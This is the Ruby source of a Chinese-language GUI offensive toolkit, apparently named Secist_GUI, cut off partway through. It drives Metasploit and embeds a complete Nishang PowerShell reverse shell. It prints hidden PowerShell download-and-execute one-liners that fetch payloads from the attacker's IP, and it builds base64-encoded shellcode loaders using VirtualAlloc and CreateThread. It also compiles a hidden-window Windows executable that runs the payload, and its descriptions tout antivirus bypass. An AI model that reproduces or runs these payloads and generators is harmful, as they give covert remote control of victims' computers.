require('zerenity/entry')
require('zerenity/list')
require 'socket'
require 'optparse'
require 'colorize'
require 'artii'
require 'fileutils'
require 'gtk2'
require 'base64'
require("zerenity/info")
############################################################################################################################
def local_ip
  orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true  # turn off reverse DNS resolution temporarily

  UDPSocket.open do |s|
    s.connect '64.233.187.99', 1
    s.addr.last
  end
ensure
  Socket.do_not_reverse_lookup = orig
end
$ip1=local_ip()
# 定义了 ip1 => 获取ip

class Clear
   def Clear.msf
      system "clear"
      system "service postgresql start"
      system "service apache2 start"
   end
end
# 定义了system clear &&postgresql开启服务  => Clear.msf
############################################################################################################################
class Invoke_powerShellTcp
   def Invoke_powerShellTcp.msf
invoke_powerShellTcp = %{function Invoke-PowerShellTcp
{
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )


    try
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()
            $client = $listener.AcceptTcpClient()
        }

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target."
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}
  }
  end
end

#   # web_delivery = Zerenity::List(:title=>"Web_delivery & PAYLOAD",
#   # :columns=>["单选","Target","METASPLOIT & PAYLOAD"],
#   # :data=>[[true,"powershell","windows/meterpreter/reverse_tcp"],
#   # [false,"python","windows/meterpreter/reverse_tcp"],
#   # [false,"php","php/meterpreter/reverse_tcp"],
#   # [false,"back","                      返回上一级菜单"],
#   # [false,"out","                            退出菜单"]],:radiolist=>true)
#   # web_delivery ? web_delivery : puts("你没有选择Target","\n\n")
# # 定义了payload
# # 定义了控件
#
#  # if web_delivery [0] == "powershell"
#   system(" msfconsole -x 'use exploit/multi/script/web_delivery;\n set PAYLOAD windows/meterpreter/reverse_tcp;\n set TARGET 2;\n set LHOST #{ip};\n set LPORT #{port};\n set URIPATH /;\n run'")
#  elsif web_delivery [0] == "python"
#   system(" msfconsole -x 'use exploit/multi/script/web_delivery;\n set LHOST #{ip};\n set LPORT #{port};\n set URIPATH /;\n run'")
#  elsif web_delivery [0] == "php"
#   system "service postgresql start"
#   system(" msfconsole -x 'use exploit/multi/script/web_delivery;\n set PAYLOAD php/meterpreter/reverse_tcp;\n set TARGET 1;\n set LHOST #{ip};\n set LPORT #{port};\n set URIPATH /;\n run'")
#  elsif web_delivery [0] == "back"
#    Banner.msf
#  else  web_delivery [0] == "out"
#    return true
#  end
# end
# end
# --------------------------------------------------------------------------------------------------
############################################################################################################################
# 定义了 Banner 信息
class Banner
  def Banner.msf
  FileUtils.rm_r Dir.glob ("output")
  Clear.msf
  a = Artii::Base.new :font => 'basic'
   puts a.asciify('      secist').light_red
   puts  "          -- -- +=[(c) 2017 | www.ggsec.cn | www.secist.com | Demon"
   puts " "
   puts  "         /==========================########========================\\"
   puts  "         |                            # v1.0                        |"
   puts  "         |                          GUI框架整改1.0                  |"
   puts "         |———————————#—————————————————#——————————————————#—————————|"
   puts "         |                                           Demon 2017     |"
   puts "         \\==========================================================/","\n\n"
   print "    当前的用户名是: "
   system "whoami"
   puts "    本机ip: #{$ip1}"
   os = `uname -a`
   if ( os =~ /kali(.*)/)
   puts "    操作系统是: Debian Kali "
   elsif ( os =~ /Darwin Kernel(.*)/ )
   puts "    操作系统是: Mac OS X"
   elsif ( os =~ /Ubuntu(.*)/ )
   puts "    操作系统是: Ubuntu","\n\n"

  end
 end
end
# 定义了 Banner 信息  => Banner.msf

############################################################################################################################
class Web_delivery
  def Web_delivery.msf

  a = Artii::Base.new
  puts a.asciify('      Web  delivery').light_red ,"\n\n\n"
  puts "     Web_delivery 该模块快速启动一个服务有效负载的Web服务器。该提供的命令将启动指定的脚本语言
   解释器，然后下载并执行有效载荷。 主要的该模块的目的是在目标上快速建立一个会话机器当攻击者
    必须手动输入 命令时自己，例如 命令注入，RDP会话，本地访问或也许远程命令执行 这个攻击向导
   不会写入磁盘不太可能触发AV解决方案，并允许特权Meterpreter提供的升级。 使用PSH时目标，确保
   有效载荷架构与目标计算机相匹配或使用SYSWOW64 powershell.exe在x64上执行x86有效载荷机器。","\n\n\n"
  end
end
# # 定义了 Web  delivery : banner信息   =>  Web_delivery.msf
# ############################################################################################################################
class Bypass_server
  def Bypass_server.msf

  a = Artii::Base.new
  puts a.asciify('      Bypass   server').light_red ,"\n\n\n"
  puts "     此模块简化了Regsvr32.exe应用程序白名单Bypass技术,该模块创建一个托管.sct的Web服务器文件。
   当用户在系统上键入提供的regsvr32命令时，regsvr32将请求.sct文件，然后执行包含的PowerShell
   命令。 该命令然后下载并执行指定的有效载荷（类似于具有PSH的web_delivery模块）。两个Web请求
   （即.sct文件和PowerShell下载执行）可以发生在同一个端口上。","\n\n\n"
  end
end
# # 定义了 Web  delivery : banner信息   =>  Web_delivery.msf
# ############################################################################################################################
class Invoke
  def Invoke.msf

  a = Artii::Base.new
  puts a.asciify('        Invoke').light_red ,"\n\n\n"
  puts "                Nishang是一个PowerShell攻击框架，它是PowerShell攻击脚本和有效载荷的一个集合。
             Nishang被广泛应用于渗透测试的各个阶段.Powershell是windows下面非常强大的命令行工具，
             并且在windows中Powershell可以利用. NET Framework的强大功能，也可以调用windows API，
             在win7/server 2008以后，powershell已被集成在系统当中。 除此之外，使用powershell能很
             好的bypass各种AV，在渗透测试中可谓是一个神器","\n\n\n"
  end
end
# 定义了 Web  delivery : banner信息   =>  Web_delivery.msf
############################################################################################################################
class Ps1encode
  def Ps1encode.msf

  a = Artii::Base.new
  puts a.asciify('        Ps1encode').light_red ,"\n\n\n"
  puts "                  Ps1encode是一个用于生成和编码基于powerhell的metasploit有效载荷。
                      原连接 =>https://github.com/CroweCybersecurity/ps1encode
                      raw, cmd, vba, vbs, war, exe等，我对命令版进行了大致的改写，改成GUI版
                      基于PowerSploit的Powershell代码由Matthew Graeber和SET由Dave Kennedy编写
                      https://rvnsec.wordpress.com/2014/09/01/ps1encode-powershell-for-days/
                      https://rvnsec.wordpress.com/2015/12/18/shell-party-continues/

             ","\n\n\n"
  end
end
# 定义了 Web  delivery : banner信息   =>  Web_delivery.msf
############################################################################################################################
class Avoidz
  def Avoidz.msf

  a = Artii::Base.new
  puts a.asciify('                Avoidz').light_red ,"\n\n\n"
  puts "                       这工具生成 encoded powershell 和 metasploit payloads,convert
                      C, C#, py, go Templates to EXE's.
                      avoidz:  https://github.com/M4sc3r4n0/avoidz
                      将该工具集合在本人命令行版:https://github.com/demonsec666/secist_script
             ","\n\n\n"
  end
end
# 定义了 Web  delivery : banner信息   =>  Web_delivery.msf
############################################################################################################################

class String
  def to_hex
    #"0x" + self.to_i.to_s(16)
    sprintf("0x%02x", self.to_i)
  end
end
def gen_PS_shellcode()

    results = []
    resultsS = ""


    File.open('raw_shellcode_temp').each_byte do |b|
        results << b
    end

    #remove temp
    system("rm raw_shellcode_temp")

    #go through the array, convert each byte in the array to a hex string
    results.each do |i|
        resultsS = resultsS + i.to_s.to_hex + ","
    end

    #remove last unnecessary comma
    resultsS = resultsS.chop

    #powershell script to be executed pre-encode
    finstring = "$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = #{resultsS};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";$cmd = \"-nop -noni -enc \";iex \"& $x86 $cmd $gq\"}else{$cmd = \"-nop -noni -enc\";iex \"& powershell $cmd $gq\";}"

    #convert to UTF-16 (powershell interprets base64 of UTF-16)
    ec = Encoding::Converter.new("UTF-8", "UTF-16LE")
    utfEncoded =  ec.convert(finstring)

    #string to base64 - final
    finPS = Base64.encode64(utfEncoded).gsub(/\n/, '')

    return finPS
end


def prep_PS_chunk(ps_shellcode)
    #The below iterates through the string and chops up strings into 254 character lengths & puts it into a 2-dimensional array
    splitup = []
    splitup = ps_shellcode.scan(/.{1,254}/)

    stringCommands=""
    varFinal="stringFinal=stringA+stringB+"

    splitup = splitup.flatten  #make the 2-dimensional array 1-dimensional to easier iterate
    splitup.each_with_index do |val, index|   #cycle through the array and create the strings for VBA
        val=val.tr '"',''  #strip out any prior quotes in the command
        stringCommands = stringCommands+"string#{index}=\"#{val}\"\n"
        varFinal=varFinal+"string#{index}+"
    end

    varFinal=varFinal[0..-2]  #create the final command that will be executed, this removes the "+" sign from the last command
    return stringCommands + "\n" + varFinal
end

############################################################################################################################
#定义了菜单按钮
  class RubyApp  < Gtk::Window

      def initialize
          super
          set_title "☠Secist_GUI☠"
          signal_connect "destroy" do
              Gtk.main_quit
          end

          init_ui

          set_default_size 500, 100
          set_window_position Gtk::Window::POS_CENTER

          show_all
      end
# 定义了标题


def init_ui
          Banner.msf

          mb = Gtk::MenuBar.new

          filemenu = Gtk::Menu.new
          filem = Gtk::MenuItem.new "MSF_moudle"
          filem.set_submenu filemenu

          mb.append filem

##############################################################
          menu1 = Gtk::Menu.new
          msf_moudle = Gtk::MenuItem.new "☠Msf  moudle"
          msf_moudle.set_submenu menu1
          # 定义了菜单1按钮  => msf  moudle
##############################################################

          menu2 = Gtk::Menu.new
          web_delivery = Gtk::MenuItem.new "☠Web  delivery(MSF)"
          web_delivery.set_submenu menu2
          # 定义了菜单2按钮 => Web  delivery
##############################################################

        menu3 = Gtk::Menu.new
        bypass_server = Gtk::MenuItem.new "☠Bypass server(MSF)"
        bypass_server.signal_connect "activate" do
        Clear.msf
        # 清屏
        Bypass_server.msf
        # 输出Web_delivery banner
        ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
        ip ? ip : puts("你没有输入ip","\n\n")
        port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT :4444☠",:port=>true ,:Entry => "1")
        port ? port : puts("你没有输入lport","\n\n")
        puts " [☠] 正在启动msf "
        system("xterm  -geometry 124x26 -e msfconsole -x 'use exploit/windows/misc/regsvr32_applocker_bypass_server;\n set LHOST #{ip};\n set LPORT #{port};\n set URIPATH /;\n run'")
         Gtk.main_quit
      end
        # 获取ip /port
        # 定义了菜单3按钮 => Bypass server
##############################################################

        menu4 = Gtk::Menu.new
        invoke_powerShellTcp = Gtk::MenuItem.new "☠Nishang  PAYLOAD (NC)☠"
        invoke_powerShellTcp.signal_connect "activate" do
        Clear.msf
        # 清屏
        Invoke.msf
       Dir.mkdir("output",755)

        ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
        ip ? ip : puts("你没有输入ip","\n\n")
        port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT :4444☠",:port=>true )
        port ? port : puts("你没有输入lport","\n\n")
        File.write( 'output/Invoke-PowerShellTcp.ps1', Invoke_powerShellTcp.msf)
         append = File.open('output/Invoke-PowerShellTcp.ps1', "a+")
         append.puts "Invoke-PowerShellTcp -Reverse -IPAddress #{ip}  -Port #{port} "
         append.close
         FileUtils.cp("output/Invoke-PowerShellTcp.ps1" , "/var/www/html/")
          puts  "[☠复制此段代码☠ =>]      powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://#{ip}/Invoke-PowerShellTcp.ps1');"
          system ("xterm  -geometry 124x26 -e nc -vv -l -p #{port}")
        # system("msfconsole -x 'use exploit/windows/misc/regsvr32_applocker_bypass_server;\n set LHOST #{ip};\n set LPORT #{port};\n set URIPATH /;\n run'")
         Gtk.main_quit
        #  Dir::delete("output")
      end
        # 获取ip /port
        # 定义了菜单4按钮 => Bypass server
###############################################################################################################################################################
################################################################################################################
          powershell = Gtk::MenuItem.new "☠Powershell"
            powershell.signal_connect "activate"do
            Clear.msf
            # 清屏
            Web_delivery.msf
            # 输出Web_delivery banner
            ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
            ip ? ip : puts("你没有输入ip","\n\n")
            port = Zerenity::Entry(:title=>"☠LPOR☠T",:text=>"☠Example  LPORT :4444☠",:port=>true)
            port ? port : puts("你没有输入lport","\n\n")
            # 获取ip /port
            puts " [☠] 正在启动msf "
            system(" xterm  -geometry 124x26 -e msfconsole -x 'use exploit/multi/script/web_delivery;\n set PAYLOAD windows/meterpreter/reverse_tcp;\n set TARGET 2;\n set LHOST #{ip};\n set LPORT #{port};\n set URIPATH /;\n run'")
            # msfconsole => Web_delivery
             Gtk.main_quit
          end
          # (菜单2)设置powershell =>  需要做的一些事情
#####################################################################################################################3

          python = Gtk::MenuItem.new "☠Python"
          python.signal_connect "activate"do
          ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
          ip ? ip : puts("你没有输入ip","\n\n")
          port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT  :4444☠",:port=>true)
          port ? port : a = puts("你没有输入lport","\n\n")
          puts " [☠] 正在启动msf "
          system("xterm  -geometry 124x26 -e msfconsole -x 'use exploit/multi/script/web_delivery;\n set LHOST #{ip};\n set LPORT #{port};\n set URIPATH /;\n run'")
           Gtk.main_quit
          end
          #  (菜单2)设置python =>  需要做的一些事情
##################################################################################################

          php = Gtk::MenuItem.new "☠PHP"
          php.signal_connect "activate" do
            ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
            ip ? ip : puts("你没有输入ip","\n\n")
            # 定义了ip
            port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT  :4444☠",:port=>true)
            port ? port : puts("你没有输入lport","\n\n")
            puts " [☠] 正在启动msf "
             system(" xterm  -geometry 124x26 -e msfconsole -x 'use exploit/multi/script/web_delivery;\n set PAYLOAD php/meterpreter/reverse_tcp;\n set TARGET 1;\n set LHOST #{ip};\n set LPORT #{port};\n set URIPATH /;\n run'")
             Gtk.main_quit
          end
          #  (菜单2)设置php =>  需要做的一些事情
################################################################################################################


     menu5 = Gtk::Menu.new
     ps1encode = Gtk::MenuItem.new "☠ Ps1enCode"
     ps1encode.set_submenu menu5
# 定义了菜单5按钮 => Ps1enCode
#菜单5 :{设置ps1encode 原始（只有编码的有效载荷 - 没有powerhell运行选项） => ip /port/payload => base64}
###############################################################################################################################################################
   cmd = Gtk::MenuItem.new "☠ CMD"
   cmd.signal_connect "activate"do
   system ("clear")
   Ps1encode.msf
   Dir.mkdir("output",755)
   ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
   ip ? ip : puts("你没有输入ip","\n\n")
   port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT  :4444☠",:port=>true)
   port ? port :  puts("你没有输入lport","\n\n")

  payload = Zerenity::List(:title=>"Web_delivery & PAYLOAD",
  :columns=>["单选","Target","METASPLOIT & PAYLOAD"],
  :data=>[[true,"https","windows/meterpreter/reverse_https"],
  [false,"tcp","windows/meterpreter/reverse_tcp"],
  [false,"http","windows/meterpreter/reverse_http"]],:radiolist=>true)
  payload ? payload :  puts("你没有输入payload","\n\n")

 if payload [0] == "https"
   payload = "windows/meterpreter/reverse_https"
   system("msfvenom -p #{payload} LHOST=#{ip} LPORT=#{port} --arch x86 --platform windows --smallest -f raw > raw_shellcode_temp")
   powershell_encoded = gen_PS_shellcode()
   puts "powershell -nop -win Hidden -noni -enc " + powershell_encoded
   system("xterm  -geometry 124x26 -e msfconsole -x 'use exploit/multi/handler;\n set PAYLOAD #{payload};\n set LHOST #{ip};\n set LPORT #{port};\n run'")
# set  => msf  payload  =>reverse https
 elsif payload [0] == "tcp"
   payload = "windows/meterpreter/reverse_tcp"
   system("msfvenom -p #{payload} LHOST=#{ip} LPORT=#{port} --arch x86 --platform windows --smallest -f raw > raw_shellcode_temp")
   powershell_encoded = gen_PS_shellcode()
   puts "powershell -nop -win Hidden -noni -enc " + powershell_encoded
   system("xterm  -geometry 124x26 -e msfconsole -x 'use exploit/multi/handler;\n set PAYLOAD #{payload};\n set LHOST #{ip};\n set LPORT #{port};\n run'")
# set  => msf  payload  =>reverse tcp
 else payload [0] == "http"
   payload = "windows/meterpreter/reverse_http"
   system("msfvenom -p #{payload} LHOST=#{ip} LPORT=#{port} --arch x86 --platform windows --smallest -f raw > raw_shellcode_temp")
   powershell_encoded = gen_PS_shellcode()
   puts "powershell -nop -win Hidden -noni -enc " + powershell_encoded
   system("xterm  -geometry 124x26 -e msfconsole -x 'use exploit/multi/handler;\n set PAYLOAD #{payload};\n set LHOST #{ip};\n set LPORT #{port};\n run'")
# set  => msf  payload  =>reverse http

 end

Gtk.main_quit
end
###############################################################################################################################################################
#菜单5{设置ps1encode 输出的保存为bat => ip /port/payload => base64}
###############################################################################################################################################################
  bat = Gtk::MenuItem.new "☠ Bat"
  bat.signal_connect "activate"do
  system ("clear")
  Ps1encode.msf
  Dir.mkdir("output",755)
  ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
  ip ? ip : puts("你没有输入ip","\n\n")

  port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT  :4444☠",:port=>true)
  port ? port :  puts("你没有输入lport","\n\n")

  payload = Zerenity::List(:title=>"Web_delivery & PAYLOAD",
  :columns=>["单选","Target","METASPLOIT & PAYLOAD"],
  :data=>[[true,"https","windows/meterpreter/reverse_https"],
  [false,"tcp","windows/meterpreter/reverse_tcp"],
  [false,"http","windows/meterpreter/reverse_http"]],:radiolist=>true)
  payload ? payload :  puts("你没有输入payload","\n\n")

 if payload [0] == "https"
   payload = "windows/meterpreter/reverse_https"
   system("msfvenom -p #{payload} LHOST=#{ip} LPORT=#{port} --arch x86 --platform windows --smallest -f raw > raw_shellcode_temp")
   powershell_encoded = gen_PS_shellcode()
    File.write( 'output/ps1encode.bat', "powershell -nop -win Hidden -noni -enc " + powershell_encoded)
    puts  "[☠文件路径☠ =>] output/ps1encode.bat "
   system("xterm  -geometry 124x26 -e msfconsole -x 'use exploit/multi/handler;\n set PAYLOAD #{payload};\n set LHOST #{ip};\n set LPORT #{port};\n run'")

 elsif payload [0] == "tcp"
   payload = "windows/meterpreter/reverse_tcp"
   system("msfvenom -p #{payload} LHOST=#{ip} LPORT=#{port} --arch x86 --platform windows --smallest -f raw > raw_shellcode_temp")
   powershell_encoded = gen_PS_shellcode()
   File.write( 'output/ps1encode.bat', "powershell -nop -win Hidden -noni -enc " + powershell_encoded)
    puts  "[☠文件路径☠ =>] output/ps1encode.bat "
   system("xterm  -geometry 124x26 -e msfconsole -x 'use exploit/multi/handler;\n set PAYLOAD #{payload};\n set LHOST #{ip};\n set LPORT #{port};\n run'")

 else payload [0] == "http"
   payload = "windows/meterpreter/reverse_http"
   system("msfvenom -p #{payload} LHOST=#{ip} LPORT=#{port} --arch x86 --platform windows --smallest -f raw > raw_shellcode_temp")
   powershell_encoded = gen_PS_shellcode()
   File.write( 'output/ps1encode.bat', "powershell -nop -win Hidden -noni -enc " + powershell_encoded)
  puts  "[☠文件路径☠ =>] output/ps1encode.bat "
   system("xterm  -geometry 124x26 -e msfconsole -x 'use exploit/multi/handler;\n set PAYLOAD #{payload};\n set LHOST #{ip};\n set LPORT #{port};\n run'")
 end

Gtk.main_quit
end



###############################################################################################################################################################
#设置菜单5{ps1encode 输出的保存为 ps1 => ip /port/payload => base64}
###############################################################################################################################################################
  ps1 = Gtk::MenuItem.new "☠ PS1"
  ps1.signal_connect "activate"do
  system ("clear")
  Ps1encode.msf
  Dir.mkdir("output",755)
  ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
  ip ? ip : puts("你没有输入ip","\n\n")
  port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT  :4444☠",:port=>true)
  port ? port :  puts("你没有输入lport","\n\n")

  payload = Zerenity::List(:title=>"Web_delivery & PAYLOAD",
  :columns=>["单选","Target","METASPLOIT & PAYLOAD"],
  :data=>[[true,"https","windows/meterpreter/reverse_https"],
  [false,"tcp","windows/meterpreter/reverse_tcp"],
  [false,"http","windows/meterpreter/reverse_http"]],:radiolist=>true)
  payload ? payload :  puts("你没有输入payload","\n\n")
#设置 ip /port

 if payload [0] == "https"
   payload = "windows/meterpreter/reverse_https"
   system("msfvenom -p #{payload} LHOST=#{ip} LPORT=#{port} --arch x86 --platform windows --smallest -f raw > raw_shellcode_temp")
   powershell_encoded = gen_PS_shellcode()
    File.write( 'output/ps1encode.ps1', "powershell -nop -win Hidden -noni -enc " + powershell_encoded)
    FileUtils.cp("output/ps1encode.ps1" , "/var/www/html/")
    puts  "[☠复制此段代码☠ =>]      powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://#{ip}/ps1encode.ps1');"
   system("xterm  -geometry 124x26 -e msfconsole -x 'use exploit/multi/handler;\n set PAYLOAD #{payload};\n set LHOST #{ip};\n set LPORT #{port};\n run'")
# 设置 msf = payload => meterpreter https

 elsif payload [0] == "tcp"
   payload = "windows/meterpreter/reverse_tcp"
   system("msfvenom -p #{payload} LHOST=#{ip} LPORT=#{port} --arch x86 --platform windows --smallest -f raw > raw_shellcode_temp")
   powershell_encoded = gen_PS_shellcode()
   File.write( 'output/ps1encode.ps1', "powershell -nop -win Hidden -noni -enc " + powershell_encoded)
   FileUtils.cp("output/ps1encode.ps1" , "/var/www/html/")
  puts  "[☠复制此段代码☠ =>]      powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://#{ip}/ps1encode.ps1');"
   system("xterm  -geometry 124x26 -e msfconsole -x 'use exploit/multi/handler;\n set PAYLOAD #{payload};\n set LHOST #{ip};\n set LPORT #{port};\n run'")
# 设置 msf = payload => meterpreter tcp


 else payload [0] == "http"
   payload = "windows/meterpreter/reverse_http"
   system("msfvenom -p #{payload} LHOST=#{ip} LPORT=#{port} --arch x86 --platform windows --smallest -f raw > raw_shellcode_temp")
   powershell_encoded = gen_PS_shellcode()
   File.write( 'output/ps1encode.ps1', "powershell -nop -win Hidden -noni -enc " + powershell_encoded)
   FileUtils.cp("output/ps1encode.ps1" , "/var/www/html/")
    puts  "[☠复制此段代码☠ =>]      powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://#{ip}/ps1encode.ps1');"
   system("xterm  -geometry 124x26 -e msfconsole -x 'use exploit/multi/handler;\n set PAYLOAD #{payload};\n set LHOST #{ip};\n set LPORT #{port};\n run'")

# 设置 msf = payload => meterpreter http
 end

Gtk.main_quit
end
#
###############################################################################################################################################################
      menu6 = Gtk::Menu.new
      avoidz = Gtk::MenuItem.new "☠ Avoidz"
      avoidz.set_submenu menu6
      # 定义了菜单6按钮 => Avoidz
###############################################################################################################################################################
      temp1 = Gtk::MenuItem.new "☠ Temp1"
      temp1.signal_connect "activate"do
      system ("clear")
      Avoidz.msf
     Dir.mkdir("output",755)
     ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
     ip ? ip : puts("你没有输入ip","\n\n")
     port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT  :4444☠",:port=>true)
     port ? port :  puts("你没有输入lport","\n\n")

     payload = Zerenity::List(:title=>"Web_delivery & PAYLOAD",
     :columns=>["单选","Target","METASPLOIT & PAYLOAD"],
     :data=>[[true,"https","windows/meterpreter/reverse_https"],
     [false,"tcp","windows/meterpreter/reverse_tcp"],
     [false,"http","windows/meterpreter/reverse_http"]],:radiolist=>true)
     payload ? payload :  puts("你没有输入payload","\n\n")
     payload = payload [1]

     #determine if MinGW has been installed, support new and old MinGW system paths
     mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
     if mingw == false
         puts "[*] You must have MinGW-32 installed in order to compile EXEs!!".red
         puts "\n\t[*] Run script setup.sh : ./setup.sh \n".red
         exit 1
     end
     Zerenity::Info(:text=>" ☠ payload 生成中 =>exe ☠ 请耐心等待几分钟 ☠  " ,:title=>"☠output☠")
     system("msfvenom -p #{payload} lhost=#{ip} lport=#{port} --platform windows -a x86 -e cmd/powershell_base64 -i 3 --smallest -s 341 -f raw -o raw_shellcode_temp > /dev/null 2>&1")
         powershell_encoded = gen_PS_shellcode()

     exeTEMPLATE = %{#include <stdio.h>
     #include <windows.h>
     int shellCode(){
     	system("color 63");
     	system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}");
     	/*
     		((Shell Code into the console))
     	*/
     	return 0;
     }
     void hide(){
     	HWND stealth;
     	AllocConsole();
     	stealth = FindWindowA("ConsoleWindowClass",NULL);
     	ShowWindow (stealth,0);
     }
     int main(){
     	hide();
     	shellCode();
     	return 0;
     }
     }

     #write out to a new file
     c_file_temp = File.new("c_file_temp.c", "w")
     c_file_temp.write(exeTEMPLATE)
     c_file_temp.close

     #compiling will require MinGW installed - "apt-get install mingw32"


     system("i586-mingw32msvc-gcc c_file_temp.c -o output/temp1.exe -lws2_32 -mwindows")
     system("rm c_file_temp.c")
     Zerenity::Info(:text=>" ☠ payload exec generated in => {☠ output/temp1.exe} ☠  " ,:title=>"☠output☠")

             system("service postgresql start")
             system("xterm  -geometry 124x26 -e msfconsole -x 'use multi/handler;\n set lhost #{ip};\n set lport #{port};\n set payload #{payload};\n exploit -j -z'")





     Gtk.main_quit
     end
     # 定义了菜单6按钮 => Avoidz{=> temp1}
###############################################################################################################################################################
     temp2 = Gtk::MenuItem.new "☠ Temp2"
     temp2.signal_connect "activate"do
     system ("clear")
     Avoidz.msf
    Dir.mkdir("output",755)
    ip = Zerenity::Entry(:title=>"☠LHOST☠",:text =>"☠Example : #{$ip1}☠", :ip => true)
    ip ? ip : puts("你没有输入ip","\n\n")
    port = Zerenity::Entry(:title=>"☠LPORT☠",:text=>"☠Example  LPORT :4444☠",:port=>true)
    port ? port :  puts("你没有输入lport","\n\n")

    #设置 ip /port
    payload = Zerenity::List(:title=>"Web_delivery & PAYLOAD",
    :columns=>["单选","Target","METASPLOIT & PAYLOAD"],
    :data=>[[true,"https","windows/meterpreter/reverse_https"],
    [false,"tcp","windows/meterpreter/reverse_tcp"],
    [false,"http","windows/meterpreter/reverse_http"]],:radiolist=>true)
    payload ? payload :  puts("你没有输入payload","\n\n")
    payload = payload [1]

    mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
    if mingw == false
        puts "[*] You must have MinGW-32 installed in order to compile EXEs!!".red
        puts "\n\t[*] Run script setup.sh : ./setup.sh \n".red
        exit 1
    end
    Zerenity::Info(:text=>" ☠ payload 生成中 =>exe ☠ 请耐心等待几分钟 ☠  " ,:title=>"☠output☠")
     system("msfvenom -p #{payload} lhost=#{ip} lport=#{port} --platform windows -a x86 -e cmd/powershell_base64 -i 3 --smallest -s 341 -f raw -o raw_shellcode_temp > /dev/null 2>&1")
        powershell_encoded = gen_PS_shellcode()

    apacheTEMPLATE = %{#include <stdio.h>
